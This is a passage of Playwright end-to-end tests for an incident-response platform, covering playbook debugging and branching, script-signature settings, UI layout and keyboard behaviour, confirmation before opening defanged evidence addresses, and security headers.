  await expect(row).toContainText('e2e_vips')
  const made = await page.request.get('/api/lists/e2e_vips')
  expect((await made.json()).entries[0].key).toBe('ceo')

  // The same file again has nothing to do.
  await settings.getByLabel('A pack file').setInputFiles(packFile)
  await expect(plan).toContainText('Version 1.0.0 is installed. 1 the same, 1 in conflict.')
  await plan.getByRole('button', { name: 'Cancel' }).click()

  // Making a pack: the list is chosen, the file is offered.
  await settings.getByRole('button', { name: 'Export a pack' }).click()
  const form = settings.getByRole('region', { name: 'Export a pack' })
  await form.getByLabel('Name', { exact: true }).fill('Our lists')
  await expect(form.getByLabel('Id', { exact: true })).toHaveValue('our-lists')
  await expect(form.getByRole('button', { name: 'Export' })).toBeDisabled()
  await form.getByRole('group', { name: 'Lists' }).getByLabel('E2E VIPs').check()
  const download = page.waitForEvent('download')
  await form.getByRole('button', { name: 'Export' }).click()
  expect((await download).suggestedFilename()).toBe('our-lists-1.0.0.nikpack')

  await row.getByRole('button', { name: 'Take E2E pack off the list' }).click()
  await expect(settings.getByRole('status')).toContainText('What it brought stays.')
  await page.getByRole('button', { name: 'Close platform settings' }).click()
})

test('a draft is debugged: the run stops before a node, takes what is typed, and skips the next', async () => {
  // A playbook that is only a draft (made through the API: the canvas has its own test).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Debug me' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const note = (id, name, y, text) => ({
    id,
    kind: 'action',
    name,
    position: { x: 40, y },
    config: { action: 'nik.add-note', args: { text } },
  })
  const draft = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      note('first', 'First note', 160, 'written by the playbook'),
      note('second', 'Second note', 280, 'never written'),
    ],
    edges: [
      { from: 'start', to: 'first' },
      { from: 'first', to: 'second' },
    ],
  }
  const saved = await page.request.put(`/api/automation/playbooks/${playbookId}`, { data: { draft } })
  expect(saved.status()).toBe(200)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
  await area.getByRole('row').filter({ hasText: 'Debug me' }).getByRole('button', { name: 'Debug me' }).click()
  await expect(area.getByRole('heading', { name: 'Debug me' })).toBeVisible()
  await area.getByRole('button', { name: 'Debug…' }).click()
  const ask = page.getByRole('dialog', { name: 'Debug "Debug me"' })
  // There is no saved version: the draft is what runs.
  await expect(ask.getByLabel(/^The draft, as it is drawn now/)).toBeChecked()
  await ask.getByRole('combobox').selectOption({ index: 1 })
  await ask.getByRole('button', { name: 'Start debugging' }).click()

  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const debug = area.getByRole('region', { name: 'Debugger' })
  await expect(debug.getByRole('status')).toContainText('Stopped before First note.', { timeout: 20_000 })
  await expect(debug.getByRole('status')).toContainText('It runs the draft')
  await expect(area.getByRole('status', { name: 'Status of the run' })).toHaveText('stopped at a node')
  // What the node will be given, changed for this once.
  const given = debug.getByLabel(/^What First note will be given/)
  await expect(given).toHaveValue(/written by the playbook/)
  await given.fill('{ "text": "typed while debugging" }')
  await debug.getByRole('button', { name: 'Step', exact: true }).click()
  await expect(debug.getByRole('status')).toContainText('Stopped before Second note.', { timeout: 20_000 })

  // The first node ran with what was typed, and sent nothing for real: it shows what it would have done.
  const steps = area.getByRole('complementary', { name: 'Steps of the run' })
  await steps.getByRole('button', { name: /First note/ }).click()
  await expect(steps).toContainText('typed while debugging')
  // A breakpoint on the node that is selected, and off again.
  await steps.getByLabel('Stop before this node').check()
  await expect(steps.getByLabel('Stop before this node')).toBeChecked()
  await steps.getByLabel('Stop before this node').uncheck()
  await expect(steps.getByLabel('Stop before this node')).not.toBeChecked()

  await debug.getByRole('button', { name: 'Skip', exact: true }).click()
  await expect(debug.getByRole('status')).toContainText('The debug run is over.', { timeout: 20_000 })
  await expect(steps.getByRole('button', { name: /Second note/ })).toContainText('skipped')

  // Debug runs are listed apart, and are not the runs of the playbook.
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Runs' }).click()
  await expect(area.getByRole('row').filter({ hasText: 'Debug me' })).toHaveCount(0)
  await area.getByLabel('Debug runs').check()
  await expect(area.getByRole('row').filter({ hasText: 'Debug me' })).toHaveCount(1)
  const notes = await (await page.request.get('/api/automation/runs?debug=true')).json()
  expect(notes.runs[0].debug).toBe(true)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('script signatures: one Nik ships is turned off and put back, one of your own is added and deleted', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByRole('button', { name: 'Script signatures' })
    .click()
  await expect(page).toHaveURL(/\/settings\/rules\/script-signatures$/)
  const table = settings.getByRole('table', { name: 'Script signatures' })
  // What Nik ships is there, on.
  const off = table.getByRole('button', { name: /^Turn .+ off$/ }).first()
  const key = (await off.getAttribute('aria-label')).replace(/^Turn (.+) off$/, '$1')
  await off.click()
  await expect(table.getByRole('button', { name: `Turn ${key} on` })).toBeVisible()
  // Off is not a change of the signature: nothing to put back, and it is never deleted.
  await expect(table.getByRole('button', { name: `Delete ${key}` })).toHaveCount(0)
  await expect(table.getByRole('button', { name: `Restore ${key}` })).toHaveCount(0)
  await table.getByRole('button', { name: `Turn ${key} on` }).click()
  await expect(table.getByRole('button', { name: `Turn ${key} off` })).toBeVisible()
  // Changed, it says by whom and can be put back as it shipped.
  await table.getByRole('button', { name: `Edit ${key}` }).click()
  const form = settings.getByRole('form', { name: `Signature ${key}` })
  await form.getByRole('spinbutton').fill('7')
  await form.getByRole('button', { name: 'Save' }).click()
  await expect(table.getByRole('row', { name: new RegExp(key.replace('.', '\\.')) })).toContainText('changed by')
  await table.getByRole('button', { name: `Restore ${key}` }).click()
  await expect(table.getByRole('button', { name: `Restore ${key}` })).toHaveCount(0)

  // One of your own, through the API the page uses; a pattern that cannot be compiled is refused.
  const refused = await page.request.post('/api/script-signatures', {
    data: { key: 'e2e.broken', title: 'Broken', severity: 'low', points: 1, pattern: '(' },
  })
  expect(refused.status()).toBe(400)
  const made = await page.request.post('/api/script-signatures', {
    data: { key: 'e2e.gate', title: 'A gate of ours', severity: 'low', points: 1, pattern: 'e2eGate\\(' },
  })
  expect(made.status()).toBe(201)
  // Leaving the section and coming back reads the rows again.
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByRole('button', { name: 'YARA rules' }).click()
  await sections.getByRole('button', { name: 'Script signatures' }).click()
  await expect(table.getByRole('row', { name: /e2e\.gate/ })).toContainText('A gate of ours')
  await table.getByRole('button', { name: 'Delete e2e.gate' }).click()
  await expect(table.getByRole('row', { name: /e2e\.gate/ })).toHaveCount(0)
  await page.getByRole('button', { name: 'Close platform settings' }).click()
  await expect(settings).toHaveCount(0)
})

test('right-click on a playbook, a script and a dashboard offers what they do and their link', async () => {
  await page.getByRole('button', { name: 'Automations' }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  const playbooks = area.getByRole('table').first()
  const row = playbooks.getByRole('row').nth(1)
  const name = (await row.getByRole('button').first().textContent()).trim()
  await row.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu).toContainText(name)
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Open',
    'Its runs',
    'Run…',
    'Copy link',
    'Copy the name',
    'Delete…',
  ])
  // Open does what a click on the name does.
  await menu.getByRole('menuitem', { name: 'Open', exact: true }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[^/]+/)
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  await area.getByRole('table').first().getByRole('row').nth(1).click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem')).toHaveText([
    'Open',
    'Copy link',
    'Copy the name',
    'Delete…',
  ])
  await page.keyboard.press('Escape')
  await expect(page.getByRole('menu')).toHaveCount(0)
  await area.getByRole('button', { name: 'Close automations' }).click()

  await page.getByRole('button', { name: 'Dashboards', exact: true }).click()
  const boards = page.getByRole('navigation', { name: 'Your dashboards' })
  await boards.getByRole('listitem').first().click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem')).toHaveText(['Open', 'Copy link', 'Copy the name'])
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Close dashboards' }).first().click()
})

test('a connection of the canvas shows an × that removes it, and handles to route it', async () => {
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Note on high' }).click()
  const edges = area.locator('.react-flow__edge')
  // The pointer on the middle of a line: an SVG path of no width is not something to hover by itself.
  const over = async (edge) => {
    const middle = await edge.locator('.react-flow__edge-interaction').evaluate((path) => {
      const box = path.getBoundingClientRect()
      return { x: box.x + box.width / 2, y: box.y + box.height / 2 }
    })
    await page.mouse.move(middle.x, middle.y)
  }
  await expect(edges.first()).toBeAttached()
  const before = await edges.count()
  // Nothing is shown until the pointer is on the line.
  await expect(area.getByRole('button', { name: /^Remove the connection/ })).toHaveCount(0)
  await over(edges.first())
  const remove = area.getByRole('button', { name: /^Remove the connection/ })
  await expect(remove).toBeVisible()
  // A line that draws itself has one handle, to give it its first corner.
  await expect(area.getByRole('button', { name: 'Drag to make a corner here' })).toHaveCount(1)
  const handle = area.getByRole('button', { name: 'Drag to make a corner here' })
  const box = await handle.boundingBox()
  await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2)
  await page.mouse.down()
  // To the side, clear of the nodes: a corner under a node cannot be reached.
  await page.mouse.move(box.x + 240, box.y + 4, { steps: 6 })
  await page.mouse.up()
  await over(edges.first())
  await expect(area.getByRole('button', { name: /^Corner 1 of the connection/ })).toHaveCount(1)
  // Double-click takes the corner away; the × takes the connection.
  await area.getByRole('button', { name: /^Corner 1 of the connection/ }).dblclick()
  await expect(area.getByRole('button', { name: /^Corner 1 of the connection/ })).toHaveCount(0)
  await over(edges.first())
  await remove.click()
  await expect(edges).toHaveCount(before - 1)
  // The playbook is left as it was.
  for (let step = 0; step < 3; step += 1) await area.getByRole('button', { name: 'Undo' }).click()
  await expect(edges).toHaveCount(before)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('a playbook and a script are deleted from their menu, and a draft is thrown away', async () => {
  const graph = (text) => ({
    nodes: [
      { id: 'start', kind: 'trigger', name: 'start', config: { manual: true } },
      { id: 'say', kind: 'action', name: 'say', config: { action: 'nik.add-note', args: { text } } },
    ],
    edges: [{ from: 'start', to: 'say' }],
  })
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'To be deleted' } })).json()
  const saved = await page.request.post(`/api/automation/playbooks/${made.id}/versions`, {
    data: { graph: graph('one') },
  })
  expect(saved.status()).toBe(201)
  await page.request.put(`/api/automation/playbooks/${made.id}`, { data: { draft: graph('half done') } })
  const script = await page.request.post('/api/automation/scripts', { data: { name: 'ToBeDeleted' } })
  expect(script.status()).toBe(201)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  // The draft first: thrown away, the playbook is its version in use again.
  await area.getByRole('button', { name: 'To be deleted' }).click()
  await area.getByRole('button', { name: 'discard the draft' }).click()
  const discard = page.getByRole('dialog', { name: 'Discard the draft?' })
  await discard.getByRole('button', { name: 'Discard', exact: true }).click()
  await expect(area.getByRole('button', { name: 'discard the draft' })).toHaveCount(0)
  expect((await (await page.request.get(`/api/automation/playbooks/${made.id}`)).json()).draft).toBeNull()
  await area.getByRole('button', { name: 'All playbooks' }).click()

  const row = area.getByRole('row').filter({ hasText: 'To be deleted' })
  await row.click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Delete…' }).click()
  const confirm = page.getByRole('dialog', { name: 'Delete this playbook?' })
  await expect(confirm).toContainText('To be deleted')
  await confirm.getByRole('button', { name: 'Delete', exact: true }).click()
  await expect(row).toHaveCount(0)

  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  const scriptRow = area.getByRole('row').filter({ hasText: 'ToBeDeleted' })
  await scriptRow.click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Delete…' }).click()
  await page
    .getByRole('dialog', { name: 'Delete this script?' })
    .getByRole('button', { name: 'Delete', exact: true })
    .click()
  await expect(scriptRow).toHaveCount(0)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('a branch of a playbook is made, pushed over a main that moved on, and deleted', async () => {
  const graph = (text) => ({
    nodes: [
      { id: 'start', kind: 'trigger', name: 'start', config: { manual: true } },
      { id: 'say', kind: 'action', name: 'say', config: { action: 'nik.add-note', args: { text } } },
    ],
    edges: [{ from: 'start', to: 'say' }],
  })
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'Branched one' } })).json()
  const url = `/api/automation/playbooks/${made.id}`
  expect((await page.request.post(`${url}/versions`, { data: { graph: graph('one') } })).status()).toBe(201)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Branched one' }).click()
  // The side panel names the playbooks; the one that is open shows main, which is where we are.
  const tree = area.getByRole('navigation', { name: 'Playbooks and their branches' })
  await expect(tree.getByRole('button', { name: /^main/ })).toHaveAttribute('aria-current', 'page')
  await tree.getByRole('button', { name: 'New branch' }).click()
  const naming = page.getByRole('dialog', { name: 'New branch' })
  await naming.getByLabel('Name').fill('louder')
  await naming.getByRole('button', { name: 'Make the branch' }).click()

  // The branch has an address of its own, and the editor says where it is.
  await expect(page).toHaveURL(/\/automation\/playbooks\/[^/]+\/branches\/[^/]+$/)
  await expect(area.getByText('branch: louder')).toBeVisible()
  await expect(tree.getByRole('button', { name: /^louder/ })).toHaveAttribute('aria-current', 'page')
  await expect(area.getByRole('button', { name: /Save as version/ })).toHaveCount(0)
  await expect(area.getByRole('button', { name: 'Push to main…' })).toBeVisible()

  // The branch is worked on, and meanwhile main gets a version of its own.
  const [branch] = (await (await page.request.get(url)).json()).branches
  expect(branch.name).toBe('louder')
  await page.request.put(`${url}/branches/${branch.id}`, { data: { graph: graph('two') } })
  expect((await page.request.post(`${url}/versions`, { data: { graph: graph('three') } })).status()).toBe(201)
  // Main and back: the editor reads the branch again.
  await tree.getByRole('button', { name: /^main/ }).click()
  await expect(area.getByText('branch: louder')).toHaveCount(0)
  await expect(area.getByText(/playbook · version 2/)).toBeVisible()
  await tree.getByRole('button', { name: /^louder/ }).click()
  await expect(area.getByText('branch: louder')).toBeVisible()
  await expect(area.getByText(/started from version 1/)).toBeVisible()

  // Pushing says the playbook moved on, and replaces it only when told.
  await area.getByRole('button', { name: 'Push to main…' }).click()
  const push = page.getByRole('dialog', { name: /Push .louder. to main\?/ })
  await push.getByLabel('Note').fill('Louder words')
  await push.getByRole('button', { name: 'Push', exact: true }).click()
  const moved = page.getByRole('dialog', { name: 'The playbook moved on' })
  await expect(moved).toContainText('at version 2')
  expect((await (await page.request.get(url)).json()).version).toBe(2)
  await moved.getByRole('button', { name: 'Push over it' }).click()
  await expect(moved).toHaveCount(0)
  await expect(area.getByText(/playbook · version 3/)).toBeVisible()
  const after = await (await page.request.get(url)).json()
  expect(after.version).toBe(3)
  expect(after.graph.nodes[1].config.args.text).toBe('two')
  expect(after.branches[0].behind).toBe(false)

  // The list shows the branch under its playbook, and opens it.
  await area.getByRole('button', { name: 'All playbooks' }).click()
  const branches = area.getByRole('list', { name: 'Branches of Branched one' })
  await expect(branches).toContainText('louder')
  await branches.getByRole('button', { name: 'louder' }).click()
  await expect(area.getByText('branch: louder')).toBeVisible()
  await area.getByRole('button', { name: 'Delete branch…' }).click()
  await page
    .getByRole('dialog', { name: 'Delete this branch?' })
    .getByRole('button', { name: 'Delete', exact: true })
    .click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[^/]+$/)
  await expect(area.getByText('branch: louder')).toHaveCount(0)
  expect((await (await page.request.get(url)).json()).branches).toEqual([])

  expect((await page.request.delete(url)).status()).toBe(204)
  await area.getByRole('button', { name: 'All playbooks' }).click()
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('the rail: the order of a working day, and the account at its foot', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  // Every incident of the list has its number, opened in this visit or not.
  const shows = rail.getByRole('button', { name: 'Incidents', exact: true })
  if (await shows.count()) await shows.click()
  const listed = page.getByRole('navigation', { name: 'Incidents' }).getByRole('listitem')
  await expect(listed.first()).toBeVisible()
  for (const text of await listed.allTextContents()) expect(text).toMatch(/#\d{5}/)
  await expect(page.getByRole('banner').getByText(/^#\d{5}$/)).toBeVisible()
  const labels = await rail
    .getByRole('button')
    .evaluateAll((buttons) => buttons.map((button) => button.getAttribute('aria-label').replace(/ \(.*$/, '')))
  const order = [
    'incidents',
    'My tasks',
    'Dashboards',
    'IoC library',
    'Artifacts',
    'Search',
    'Playground',
    'Automations',
  ]
  const found = order.map((name) => labels.findIndex((label) => label.toLowerCase().includes(name.toLowerCase())))
  expect(found.every((index) => index >= 0)).toBe(true)
  expect([...found].sort((a, b) => a - b)).toEqual(found)
  // The foot: notifications, Settings, the account. No shortcut to a section of Settings.
  expect(labels.slice(-3).map((label) => label.split(':')[0])).toEqual([
    'Notifications',
    'Open platform settings',
    'Account',
  ])
  for (const gone of ['Audit log', 'Users', 'Full backup']) {
    await expect(rail.getByRole('button', { name: gone, exact: true })).toHaveCount(0)
  }
  // The account says who is signed in, opens one's own section and signs out.
  await rail.getByRole('button', { name: /^Account: admin/ }).click()
  const menu = page.getByRole('menu')
  await expect(menu).toContainText('admin')
  await expect(menu.getByRole('menuitem')).toHaveText(['My account', 'Sign out'])
  await menu.getByRole('menuitem', { name: 'My account' }).click()
  await expect(page).toHaveURL(/\/settings\/.*my-account$/)
  await page.getByRole('button', { name: 'Close platform settings' }).click()
})

test('a side panel is made wider and narrower with its handle, and remembers its width', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const handle = settings.getByRole('separator', { name: 'Resize the sections of Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await expect(handle).toHaveAttribute('aria-valuenow', '240')
  const before = (await sections.boundingBox()).width
  // By keyboard: the arrow that points away from the panel makes it wider.
  await handle.focus()
  await page.keyboard.press('ArrowRight')
  await page.keyboard.press('Shift+ArrowRight')
  await expect(handle).toHaveAttribute('aria-valuenow', '320')
  expect(Math.round((await sections.boundingBox()).width - before)).toBe(80)
  // By pointer.
  const box = await handle.boundingBox()
  await page.mouse.move(box.x + 1, box.y + 200)
  await page.mouse.down()
  await page.mouse.move(box.x + 41, box.y + 200, { steps: 4 })
  await page.mouse.up()
  await expect(handle).toHaveAttribute('aria-valuenow', '360')
  // It is remembered: leaving Settings and coming back finds it.
  await page.getByRole('button', { name: 'Close platform settings' }).click()
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  await expect(handle).toHaveAttribute('aria-valuenow', '360')
  // The limits hold, and Enter puts the width back.
  await handle.focus()
  await page.keyboard.press('End')
  await expect(handle).toHaveAttribute('aria-valuenow', '420')
  await page.keyboard.press('Enter')
  await expect(handle).toHaveAttribute('aria-valuenow', '240')
  await page.getByRole('button', { name: 'Close platform settings' }).click()
  // The list of incidents has the same handle.
  await expect(page.getByRole('separator', { name: 'Resize the side panel' })).toBeVisible()
})

test('the keyboard: Escape closes the dialog on top, Tab stays inside it, focus comes back', async () => {
  const gear = page.getByRole('button', { name: 'Open platform settings' })
  await gear.click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Accounts').click()
  await settings.getByRole('button', { name: `Edit user ${ADMIN.username}` }).click()
  const edit = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(edit).toBeVisible()

  // Tab never leaves the dialog on top, however many times it is pressed.
  for (let i = 0; i < 12; i += 1) {
    await page.keyboard.press('Tab')
    expect(await edit.evaluate((node) => node.contains(document.activeElement))).toBe(true)
  }
  // Escape closes that dialog only; the Settings page, under it, stays.
  await page.keyboard.press('Escape')
  await expect(edit).toHaveCount(0)
  await expect(settings).toBeVisible()
  // The focus is back on the button that opened the dialog.
  await expect(settings.getByRole('button', { name: `Edit user ${ADMIN.username}` })).toBeFocused()
  await page.keyboard.press('Escape')
  await expect(settings).toHaveCount(0)
  await expect(gear).toBeFocused()
})

test('single-key shortcuts can be turned off and on again', async () => {
  await openEvidence('Malware Analysis')
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  // The row first: its flag is counted once the list is there.
  await expect(sample).toBeVisible()
  const before = await flag.count()

  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  const toggle = help.getByRole('checkbox', { name: /Single-key shortcuts/ })
  await expect(toggle).toBeChecked()
  await toggle.uncheck()
  await page.keyboard.press('Escape')
  await sample.hover()
  await page.keyboard.press('f')
  await page.keyboard.press('?')
  await expect(flag).toHaveCount(before)
  await expect(help).toHaveCount(0)

  // Back on: the choice is kept, and F works again.
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await help.getByRole('checkbox', { name: /Single-key shortcuts/ }).check()
  await page.keyboard.press('Escape')
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)
})

test('an address from the evidence is opened only after asking', async () => {
  await openEvidence('Browser Forensics')
  await page
    .getByRole('navigation', { name: 'Browser analysis sections' })
    .getByRole('button', { name: /^Bookmarks/ })
    .click()
  const open = page.getByRole('button', { name: 'Open the address' }).first()
  await expect(open).toBeVisible()
  // No link to the suspect's address is left in the page for a stray click.
  await expect(page.locator('main a[target="_blank"]')).toHaveCount(0)

  const popups = []
  page.context().on('page', (popup) => popups.push(popup))
  await open.click()
  const ask = page.getByRole('dialog', { name: 'Open an address from the evidence?' })
  await expect(ask).toContainText('from your workstation')
  await expect(ask).toContainText(/hxxps?\[:\]\/\//)
  await ask.getByRole('button', { name: 'Copy defanged' }).click()
  await ask.getByRole('button', { name: 'Cancel' }).click()
  await expect(ask).toHaveCount(0)
  expect(popups).toEqual([])
})

test('the app runs under its security headers, and the policy blocked nothing', async ({ request }) => {
  const headers = (await request.get('/')).headers()
  expect(headers['content-security-policy']).toContain("script-src 'self' 'wasm-unsafe-eval'")
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
  expect(headers['x-content-type-options']).toBe('nosniff')
  expect(headers['x-frame-options']).toBe('DENY')
  expect(blocked).toEqual([])
})

test('the API is reachable through the same origin', async ({ request }) => {
  const health = await request.get('/api/health')
  expect(health.ok()).toBeTruthy()
  const ready = await request.get('/api/ready')
  expect(ready.ok()).toBeTruthy()
})
